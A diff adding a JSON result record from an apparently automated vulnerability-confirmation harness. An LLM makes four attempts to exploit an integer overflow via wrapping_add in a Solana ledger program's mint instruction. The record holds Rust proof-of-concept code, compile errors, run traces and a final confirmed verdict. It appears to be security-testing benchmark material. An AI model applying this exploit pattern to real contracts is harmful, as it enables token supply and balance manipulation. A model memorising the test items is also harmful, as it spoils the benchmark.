@@ -1,0 +1,222 @@
+{
+  "category": "MATH",
+  "verdict": "confirmed",
+  "exploit_successful": true,
+  "attack_result": "Success",
+  "reason": "ataque aceito e dano verificado: supply reiniciou para valor menor que o anterior (overflow); balance reiniciou para valor menor que o anterior (overflow)",
+  "attempts_used": 4,
+  "attempts": [
+    {
+      "attempt": 1,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2367,
+        "completion_tokens": 601,
+        "latency_s": 3.74
+      },
+      "raw": "{\n  \"plan\": \"Preparo uma conta ledger com supply e balance proximos de u64::MAX (ex.: u64::MAX - 5) e chamo mint com amount=10 como baseline legitimo, que deve ter sucesso e gravar os valores somados. Em seguida, ataco a mesma instrucao mint com amount=10 sobre o estado resultante do baseline, onde supply e balance ja estao em u64::MAX - 5, fazendo wrapping_add estourar. O efeito medido e que supply e balance apos o ataque ficam menores que os valores anteriores (reiniciaram para perto de zero), demonstrando o overflow silencioso.\",\n  \"scenario\": \"let ledger_key = Pubkey::new_unique();\\nlet mut ledger_data = vec![0u8; 56];\\nlet initial_supply: u64 = u64::MAX - 5;\\nlet initial_balance: u64 = u64::MAX - 5;\\nledger_data[40..48].copy_from_slice(&initial_supply.to_le_bytes());\\nledger_data[48..56].copy_from_slice(&initial_balance.to_le_bytes());\\nlet ledger = account(&env.program_id, &ledger_data, None);\\n\\nlet amount: u64 = 10;\\nlet mut ix_data = vec![0u8];\\nix_data.extend_from_slice(&amount.to_le_bytes());\\nlet ix = env.raw_ix(&ix_data, &[AccountMeta::new(ledger_key, false)]);\\n\\nlet contas = vec![(ledger_key, ledger.clone())];\\nlet r_base = env.baseline(\\\"mint legitimo com amount=10\\\", &ix, &contas);\\n\\nlet ledger_pos_base = after(&r_base, &ledger_key).clone();\\nlet contas_ataque = vec![(ledger_key, ledger_pos_base)];\\nlet r = env.attack(\\\"mint com amount=10 sobre supply/balance em u64::MAX-5\\\", &ix, &contas_ataque);\\n\\nif r.program_result == ProgramResult::Success {\\n    let data = after(&r, &ledger_key).data();\\n    let supply_apos = read_u64(data, 40);\\n    let balance_apos = read_u64(data, 48);\\n    env.effect(\\\"supply reiniciou para valor menor que o anterior (overflow)\\\", supply_apos < initial_supply);\\n    env.effect(\\\"balance reiniciou para valor menor que o anterior (overflow)\\\", balance_apos < initial_balance);\\n}\"\n}",
+      "plan": "Preparo uma conta ledger com supply e balance proximos de u64::MAX (ex.: u64::MAX - 5) e chamo mint com amount=10 como baseline legitimo, que deve ter sucesso e gravar os valores somados. Em seguida, ataco a mesma instrucao mint com amount=10 sobre o estado resultante do baseline, onde supply e balance ja estao em u64::MAX - 5, fazendo wrapping_add estourar. O efeito medido e que supply e balance apos o ataque ficam menores que os valores anteriores (reiniciaram para perto de zero), demonstrando o overflow silencioso.",
+      "scenario": "let ledger_key = Pubkey::new_unique();\nlet mut ledger_data = vec![0u8; 56];\nlet initial_supply: u64 = u64::MAX - 5;\nlet initial_balance: u64 = u64::MAX - 5;\nledger_data[40..48].copy_from_slice(&initial_supply.to_le_bytes());\nledger_data[48..56].copy_from_slice(&initial_balance.to_le_bytes());\nlet ledger = account(&env.program_id, &ledger_data, None);\n\nlet amount: u64 = 10;\nlet mut ix_data = vec![0u8];\nix_data.extend_from_slice(&amount.to_le_bytes());\nlet ix = env.raw_ix(&ix_data, &[AccountMeta::new(ledger_key, false)]);\n\nlet contas = vec![(ledger_key, ledger.clone())];\nlet r_base = env.baseline(\"mint legitimo com amount=10\", &ix, &contas);\n\nlet ledger_pos_base = after(&r_base, &ledger_key).clone();\nlet contas_ataque = vec![(ledger_key, ledger_pos_base)];\nlet r = env.attack(\"mint com amount=10 sobre supply/balance em u64::MAX-5\", &ix, &contas_ataque);\n\nif r.program_result == ProgramResult::Success {\n    let data = after(&r, &ledger_key).data();\n    let supply_apos = read_u64(data, 40);\n    let balance_apos = read_u64(data, 48);\n    env.effect(\"supply reiniciou para valor menor que o anterior (overflow)\", supply_apos < initial_supply);\n    env.effect(\"balance reiniciou para valor menor que o anterior (overflow)\", balance_apos < initial_balance);\n}",
+      "run": {
+        "kind": "compile_error",
+        "events": [],
+        "detail": "error[E0308]: mismatched types\n   --> tests/attempt.rs:20:35\n    |\n 20 | ... env.raw_ix(&ix_data, &[AccountMeta::new(ledger_key, false)]);\n    |         ------           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ expected `Vec<AccountMeta>`, found `&[AccountMeta; 1]`\n    |         |\n    |         arguments to this method are incorrect\n    |\n    = note: expected struct `Vec<dynamic_harness::AccountMeta>`\n            found reference `&[dynamic_harness::AccountMeta; 1]`\nnote: method defined here\n   --> src/lib.rs:155:12\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 1 previous error",
+        "elapsed_s": 0.6
+      },
+      "verdict": null,
+      "reason": "erro de compilacao:\nerror[E0308]: mismatched types\n   --> tests/attempt.rs:20:35\n    |\n 20 | ... env.raw_ix(&ix_data, &[AccountMeta::new(ledger_key, false)]);\n    |         ------           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ expected `Vec<AccountMeta>`, found `&[AccountMeta; 1]`\n    |         |\n    |         arguments to this method are incorrect\n    |\n    = note: expected struct `Vec<dynamic_harness::AccountMeta>`\n            found reference `&[dynamic_harness::AccountMeta; 1]`\nnote: method defined here\n   --> src/lib.rs:155:12\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 1 previous error"
+    },
+    {
+      "attempt": 2,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2993,
+        "completion_tokens": 603,
+        "latency_s": 3.27
+      },
+      "raw": "{\"plan\": \"Preparo uma conta ledger com supply e balance em u64::MAX-5 (dono = program_id). O baseline chama mint com amount=10, que estoura e reinicia os valores (wrapping). O ataque repete o mesmo mint sobre o estado resultante do baseline, causando novo overflow. O efeito mede que supply/balance apos o ataque sao menores que os valores antes do ataque, evidenciando o wrap-around.\", \"scenario\": \"let ledger_key = Pubkey::new_unique();\\nlet mut ledger_data = vec![0u8; 56];\\nlet initial_supply: u64 = u64::MAX - 5;\\nlet initial_balance: u64 = u64::MAX - 5;\\nledger_data[40..48].copy_from_slice(&initial_supply.to_le_bytes());\\nledger_data[48..56].copy_from_slice(&initial_balance.to_le_bytes());\\nlet ledger = account(&env.program_id, &ledger_data, None);\\n\\nlet amount: u64 = 10;\\nlet mut ix_data = vec![0u8];\\nix_data.extend_from_slice(&amount.to_le_bytes());\\nlet metas = vec![AccountMeta::new(ledger_key, false)];\\nlet ix = env.raw_ix(&ix_data, &metas);\\n\\nlet contas = vec![(ledger_key, ledger.clone())];\\nlet r_base = env.baseline(\\\"mint legitimo com amount=10\\\", &ix, &contas);\\n\\nlet ledger_pos_base = after(&r_base, &ledger_key).clone();\\nlet supply_antes = read_u64(ledger_pos_base.data(), 40);\\nlet balance_antes = read_u64(ledger_pos_base.data(), 48);\\n\\nlet contas_ataque = vec![(ledger_key, ledger_pos_base)];\\nlet r = env.attack(\\\"mint com amount=10 sobre supply/balance em u64::MAX-5\\\", &ix, &contas_ataque);\\n\\nif r.program_result == ProgramResult::Success {\\n    let data = after(&r, &ledger_key).data();\\n    let supply_apos = read_u64(data, 40);\\n    let balance_apos = read_u64(data, 48);\\n    env.effect(\\\"supply reiniciou para valor menor que o anterior (overflow)\\\", supply_apos < supply_antes);\\n    env.effect(\\\"balance reiniciou para valor menor que o anterior (overflow)\\\", balance_apos < balance_antes);\\n}\"}",
+      "plan": "Preparo uma conta ledger com supply e balance em u64::MAX-5 (dono = program_id). O baseline chama mint com amount=10, que estoura e reinicia os valores (wrapping). O ataque repete o mesmo mint sobre o estado resultante do baseline, causando novo overflow. O efeito mede que supply/balance apos o ataque sao menores que os valores antes do ataque, evidenciando o wrap-around.",
+      "scenario": "let ledger_key = Pubkey::new_unique();\nlet mut ledger_data = vec![0u8; 56];\nlet initial_supply: u64 = u64::MAX - 5;\nlet initial_balance: u64 = u64::MAX - 5;\nledger_data[40..48].copy_from_slice(&initial_supply.to_le_bytes());\nledger_data[48..56].copy_from_slice(&initial_balance.to_le_bytes());\nlet ledger = account(&env.program_id, &ledger_data, None);\n\nlet amount: u64 = 10;\nlet mut ix_data = vec![0u8];\nix_data.extend_from_slice(&amount.to_le_bytes());\nlet metas = vec![AccountMeta::new(ledger_key, false)];\nlet ix = env.raw_ix(&ix_data, &metas);\n\nlet contas = vec![(ledger_key, ledger.clone())];\nlet r_base = env.baseline(\"mint legitimo com amount=10\", &ix, &contas);\n\nlet ledger_pos_base = after(&r_base, &ledger_key).clone();\nlet supply_antes = read_u64(ledger_pos_base.data(), 40);\nlet balance_antes = read_u64(ledger_pos_base.data(), 48);\n\nlet contas_ataque = vec![(ledger_key, ledger_pos_base)];\nlet r = env.attack(\"mint com amount=10 sobre supply/balance em u64::MAX-5\", &ix, &contas_ataque);\n\nif r.program_result == ProgramResult::Success {\n    let data = after(&r, &ledger_key).data();\n    let supply_apos = read_u64(data, 40);\n    let balance_apos = read_u64(data, 48);\n    env.effect(\"supply reiniciou para valor menor que o anterior (overflow)\", supply_apos < supply_antes);\n    env.effect(\"balance reiniciou para valor menor que o anterior (overflow)\", balance_apos < balance_antes);\n}",
+      "run": {
+        "kind": "compile_error",
+        "events": [],
+        "detail": "error[E0308]: mismatched types\n   --> tests/attempt.rs:21:35\n    |\n 21 |     let ix = env.raw_ix(&ix_data, &metas);\n    |                  ------           ^^^^^^ expected `Vec<AccountMeta>`, found `&Vec<AccountMeta>`\n    |                  |\n    |                  arguments to this method are incorrect\n    |\n    = note: expected struct `Vec<_>`\n            found reference `&Vec<_>`\nnote: method defined here\n   --> src/lib.rs:155:12\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 1 previous error",
+        "elapsed_s": 0.6
+      },
+      "verdict": null,
+      "reason": "erro de compilacao:\nerror[E0308]: mismatched types\n   --> tests/attempt.rs:21:35\n    |\n 21 |     let ix = env.raw_ix(&ix_data, &metas);\n    |                  ------           ^^^^^^ expected `Vec<AccountMeta>`, found `&Vec<AccountMeta>`\n    |                  |\n    |                  arguments to this method are incorrect\n    |\n    = note: expected struct `Vec<_>`\n            found reference `&Vec<_>`\nnote: method defined here\n   --> src/lib.rs:155:12\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 1 previous error"
+    },
+    {
+      "attempt": 3,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 3005,
+        "completion_tokens": 602,
+        "latency_s": 3.11
+      },
+      "raw": "{\"plan\": \"Preparo uma conta ledger com supply e balance proximos de u64::MAX (u64::MAX-5). O baseline chama mint com amount=10, que estoura e reinicia os valores (wrapping). O ataque repete o mesmo mint sobre o estado resultante, demonstrando que o overflow silencioso ocorre sem erro. O efeito mede que supply e balance apos o ataque sao menores que antes, indicando o wrap-around.\", \"scenario\": \"let ledger_key = Pubkey::new_unique();\\nlet mut ledger_data = vec![0u8; 56];\\nlet initial_supply: u64 = u64::MAX - 5;\\nlet initial_balance: u64 = u64::MAX - 5;\\nledger_data[40..48].copy_from_slice(&initial_supply.to_le_bytes());\\nledger_data[48..56].copy_from_slice(&initial_balance.to_le_bytes());\\nlet ledger = account(&env.program_id, &ledger_data, None);\\n\\nlet amount: u64 = 10;\\nlet mut ix_data = vec![0u8];\\nix_data.extend_from_slice(&amount.to_le_bytes());\\nlet metas = vec![AccountMeta::new(ledger_key, false)];\\nlet ix = env.raw_ix(&ix_data, metas);\\n\\nlet contas = vec![(ledger_key, ledger.clone())];\\nlet r_base = env.baseline(\\\"mint legitimo com amount=10\\\", &ix, &contas);\\n\\nlet ledger_pos_base = after(&r_base, &ledger_key).clone();\\nlet supply_antes = read_u64(ledger_pos_base.data(), 40);\\nlet balance_antes = read_u64(ledger_pos_base.data(), 48);\\n\\nlet contas_ataque = vec![(ledger_key, ledger_pos_base)];\\nlet r = env.attack(\\\"mint com amount=10 sobre supply/balance em u64::MAX-5\\\", &ix, &contas_ataque);\\n\\nif r.program_result == ProgramResult::Success {\\n    let data = after(&r, &ledger_key).data();\\n    let supply_apos = read_u64(data, 40);\\n    let balance_apos = read_u64(data, 48);\\n    env.effect(\\\"supply reiniciou para valor menor que o anterior (overflow)\\\", supply_apos < supply_antes);\\n    env.effect(\\\"balance reiniciou para valor menor que o anterior (overflow)\\\", balance_apos < balance_antes);\\n}\"}",
+      "plan": "Preparo uma conta ledger com supply e balance proximos de u64::MAX (u64::MAX-5). O baseline chama mint com amount=10, que estoura e reinicia os valores (wrapping). O ataque repete o mesmo mint sobre o estado resultante, demonstrando que o overflow silencioso ocorre sem erro. O efeito mede que supply e balance apos o ataque sao menores que antes, indicando o wrap-around.",
+      "scenario": "let ledger_key = Pubkey::new_unique();\nlet mut ledger_data = vec![0u8; 56];\nlet initial_supply: u64 = u64::MAX - 5;\nlet initial_balance: u64 = u64::MAX - 5;\nledger_data[40..48].copy_from_slice(&initial_supply.to_le_bytes());\nledger_data[48..56].copy_from_slice(&initial_balance.to_le_bytes());\nlet ledger = account(&env.program_id, &ledger_data, None);\n\nlet amount: u64 = 10;\nlet mut ix_data = vec![0u8];\nix_data.extend_from_slice(&amount.to_le_bytes());\nlet metas = vec![AccountMeta::new(ledger_key, false)];\nlet ix = env.raw_ix(&ix_data, metas);\n\nlet contas = vec![(ledger_key, ledger.clone())];\nlet r_base = env.baseline(\"mint legitimo com amount=10\", &ix, &contas);\n\nlet ledger_pos_base = after(&r_base, &ledger_key).clone();\nlet supply_antes = read_u64(ledger_pos_base.data(), 40);\nlet balance_antes = read_u64(ledger_pos_base.data(), 48);\n\nlet contas_ataque = vec![(ledger_key, ledger_pos_base)];\nlet r = env.attack(\"mint com amount=10 sobre supply/balance em u64::MAX-5\", &ix, &contas_ataque);\n\nif r.program_result == ProgramResult::Success {\n    let data = after(&r, &ledger_key).data();\n    let supply_apos = read_u64(data, 40);\n    let balance_apos = read_u64(data, 48);\n    env.effect(\"supply reiniciou para valor menor que o anterior (overflow)\", supply_apos < supply_antes);\n    env.effect(\"balance reiniciou para valor menor que o anterior (overflow)\", balance_apos < balance_antes);\n}",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM"
+          },
+          {
+            "step": "baseline",
+            "note": "mint legitimo com amount=10",
+            "result": "Success",
+            "compute_units": 224,
+            "account_flags": "-w",
+            "ix_head": "000a000000000000",
+            "accounts": [
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 56,
+                "head": "0000000000000000",
+                "digest": "74a8be692d39ae2e",
+                "post": "0000000000000000000000000000000000000000000000000000000000000000000000000000000004000000000000000400000000000000"
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "mint com amount=10 sobre supply/balance em u64::MAX-5",
+            "result": "Success",
+            "compute_units": 224,
+            "account_flags": "-w",
+            "ix_head": "000a000000000000",
+            "accounts": [
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 56,
+                "head": "0000000000000000",
+                "digest": "d111be6ddef970fe",
+                "post": "000000000000000000000000000000000000000000000000000000000000000000000000000000000e000000000000000e00000000000000"
+              }
+            ]
+          },
+          {
+            "step": "effect",
+            "note": "supply reiniciou para valor menor que o anterior (overflow)",
+            "holds": false
+          },
+          {
+            "step": "effect",
+            "note": "balance reiniciou para valor menor que o anterior (overflow)",
+            "holds": false
+          }
+        ],
+        "runtime_trace": [
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 224 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 224 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success"
+        ],
+        "elapsed_s": 1.7
+      },
+      "verdict": "not_confirmed",
+      "reason": "ataque aceito, mas nenhuma condicao de dano foi verdadeira: supply reiniciou para valor menor que o anterior (overflow); balance reiniciou para valor menor que o anterior (overflow)\nEstado das contas gravaveis depois do ataque (hex, ate 256 bytes; confira os offsets):\nconta #0 (1111111o..): 56 bytes = 000000000000000000000000000000000000000000000000000000000000000000000000000000000e000000000000000e00000000000000"
+    },
+    {
+      "attempt": 4,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2978,
+        "completion_tokens": 796,
+        "latency_s": 4.23
+      },
+      "raw": "{\"plan\": \"O ataque anterior foi aceito mas as condições de dano não foram verdadeiras porque o baseline já havia estourado o supply/balance (u64::MAX-5 + 10 = 4), então o ataque não mudou nada. Preciso preparar o estado com supply/balance próximos de u64::MAX mas sem estourar no baseline, e usar um amount que estoure apenas no ataque. O baseline legítimo usa amount pequeno (ex.: 1) sobre supply=u64::MAX-5, resultando em u64::MAX-4 sem overflow. O ataque usa amount=10 sobre o mesmo estado, causando wrapping_add e reiniciando supply/balance para 4, valor menor que o anterior. O efeito mede que supply_apos < supply_antes e balance_apos < balance_antes.\", \"scenario\": \"let ledger_key = Pubkey::new_unique();\\nlet mut ledger_data = vec![0u8; 56];\\nlet initial_supply: u64 = u64::MAX - 5;\\nlet initial_balance: u64 = u64::MAX - 5;\\nledger_data[40..48].copy_from_slice(&initial_supply.to_le_bytes());\\nledger_data[48..56].copy_from_slice(&initial_balance.to_le_bytes());\\nlet ledger = account(&env.program_id, &ledger_data, None);\\n\\nlet amount_base: u64 = 1;\\nlet mut ix_data_base = vec![0u8];\\nix_data_base.extend_from_slice(&amount_base.to_le_bytes());\\nlet metas_base = vec![AccountMeta::new(ledger_key, false)];\\nlet ix_base = env.raw_ix(&ix_data_base, metas_base);\\n\\nlet contas_base = vec![(ledger_key, ledger.clone())];\\nlet r_base = env.baseline(\\\"mint legitimo com amount=1\\\", &ix_base, &contas_base);\\n\\nlet ledger_pos_base = after(&r_base, &ledger_key).clone();\\nlet supply_antes = read_u64(ledger_pos_base.data(), 40);\\nlet balance_antes = read_u64(ledger_pos_base.data(), 48);\\n\\nlet amount_ataque: u64 = 10;\\nlet mut ix_data_ataque = vec![0u8];\\nix_data_ataque.extend_from_slice(&amount_ataque.to_le_bytes());\\nlet metas_ataque = vec![AccountMeta::new(ledger_key, false)];\\nlet ix_ataque = env.raw_ix(&ix_data_ataque, metas_ataque);\\n\\nlet contas_ataque = vec![(ledger_key, ledger_pos_base)];\\nlet r = env.attack(\\\"mint com amount=10 sobre supply/balance em u64::MAX-4\\\", &ix_ataque, &contas_ataque);\\n\\nif r.program_result == ProgramResult::Success {\\n    let data = after(&r, &ledger_key).data();\\n    let supply_apos = read_u64(data, 40);\\n    let balance_apos = read_u64(data, 48);\\n    env.effect(\\\"supply reiniciou para valor menor que o anterior (overflow)\\\", supply_apos < supply_antes);\\n    env.effect(\\\"balance reiniciou para valor menor que o anterior (overflow)\\\", balance_apos < balance_antes);\\n}\"}",
+      "plan": "O ataque anterior foi aceito mas as condições de dano não foram verdadeiras porque o baseline já havia estourado o supply/balance (u64::MAX-5 + 10 = 4), então o ataque não mudou nada. Preciso preparar o estado com supply/balance próximos de u64::MAX mas sem estourar no baseline, e usar um amount que estoure apenas no ataque. O baseline legítimo usa amount pequeno (ex.: 1) sobre supply=u64::MAX-5, resultando em u64::MAX-4 sem overflow. O ataque usa amount=10 sobre o mesmo estado, causando wrapping_add e reiniciando supply/balance para 4, valor menor que o anterior. O efeito mede que supply_apos < supply_antes e balance_apos < balance_antes.",
+      "scenario": "let ledger_key = Pubkey::new_unique();\nlet mut ledger_data = vec![0u8; 56];\nlet initial_supply: u64 = u64::MAX - 5;\nlet initial_balance: u64 = u64::MAX - 5;\nledger_data[40..48].copy_from_slice(&initial_supply.to_le_bytes());\nledger_data[48..56].copy_from_slice(&initial_balance.to_le_bytes());\nlet ledger = account(&env.program_id, &ledger_data, None);\n\nlet amount_base: u64 = 1;\nlet mut ix_data_base = vec![0u8];\nix_data_base.extend_from_slice(&amount_base.to_le_bytes());\nlet metas_base = vec![AccountMeta::new(ledger_key, false)];\nlet ix_base = env.raw_ix(&ix_data_base, metas_base);\n\nlet contas_base = vec![(ledger_key, ledger.clone())];\nlet r_base = env.baseline(\"mint legitimo com amount=1\", &ix_base, &contas_base);\n\nlet ledger_pos_base = after(&r_base, &ledger_key).clone();\nlet supply_antes = read_u64(ledger_pos_base.data(), 40);\nlet balance_antes = read_u64(ledger_pos_base.data(), 48);\n\nlet amount_ataque: u64 = 10;\nlet mut ix_data_ataque = vec![0u8];\nix_data_ataque.extend_from_slice(&amount_ataque.to_le_bytes());\nlet metas_ataque = vec![AccountMeta::new(ledger_key, false)];\nlet ix_ataque = env.raw_ix(&ix_data_ataque, metas_ataque);\n\nlet contas_ataque = vec![(ledger_key, ledger_pos_base)];\nlet r = env.attack(\"mint com amount=10 sobre supply/balance em u64::MAX-4\", &ix_ataque, &contas_ataque);\n\nif r.program_result == ProgramResult::Success {\n    let data = after(&r, &ledger_key).data();\n    let supply_apos = read_u64(data, 40);\n    let balance_apos = read_u64(data, 48);\n    env.effect(\"supply reiniciou para valor menor que o anterior (overflow)\", supply_apos < supply_antes);\n    env.effect(\"balance reiniciou para valor menor que o anterior (overflow)\", balance_apos < balance_antes);\n}",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM"
+          },
+          {
+            "step": "baseline",
+            "note": "mint legitimo com amount=1",
+            "result": "Success",
+            "compute_units": 224,
+            "account_flags": "-w",
+            "ix_head": "0001000000000000",
+            "accounts": [
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 56,
+                "head": "0000000000000000",
+                "digest": "74a8be692d39ae2e",
+                "post": "00000000000000000000000000000000000000000000000000000000000000000000000000000000fbfffffffffffffffbffffffffffffff"
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "mint com amount=10 sobre supply/balance em u64::MAX-4",
+            "result": "Success",
+            "compute_units": 224,
+            "account_flags": "-w",
+            "ix_head": "000a000000000000",
+            "accounts": [
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 56,
+                "head": "0000000000000000",
+                "digest": "cc14b7759c48eaf3",
+                "post": "0000000000000000000000000000000000000000000000000000000000000000000000000000000005000000000000000500000000000000"
+              }
+            ]
+          },
+          {
+            "step": "effect",
+            "note": "supply reiniciou para valor menor que o anterior (overflow)",
+            "holds": true
+          },
+          {
+            "step": "effect",
+            "note": "balance reiniciou para valor menor que o anterior (overflow)",
+            "holds": true
+          }
+        ],
+        "runtime_trace": [
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 224 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 224 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success"
+        ],
+        "elapsed_s": 1.7
+      },
+      "verdict": "confirmed",
+      "reason": "ataque aceito e dano verificado: supply reiniciou para valor menor que o anterior (overflow); balance reiniciou para valor menor que o anterior (overflow)"
+    }
+  ],
+  "case_id": "SSP-03-P-V1",
+  "static_finding": {
+    "category": "MATH",
+    "confidence": "high",
+    "evidence": "let new_supply = supply.wrapping_add(amount);\nlet new_balance = balance.wrapping_add(amount);",
+    "explanation": "As operacoes de adicao usam `wrapping_add`, que silenciosamente descarta o overflow. Se `supply + amount` ou `balance + amount` excederem `u64::MAX`, o valor reinicia para perto de zero, permitindo manipular o supply/balance.",
+    "attack_hypothesis": "O atacante chama `mint` com um `amount` grande o suficiente para que `supply.wrapping_add(amount)` ou `balance.wrapping_add(amount)` estoure, fazendo o saldo/supply reiniciar para um valor pequeno ou zero e quebrando a invariante do ledger."
+  }
+}
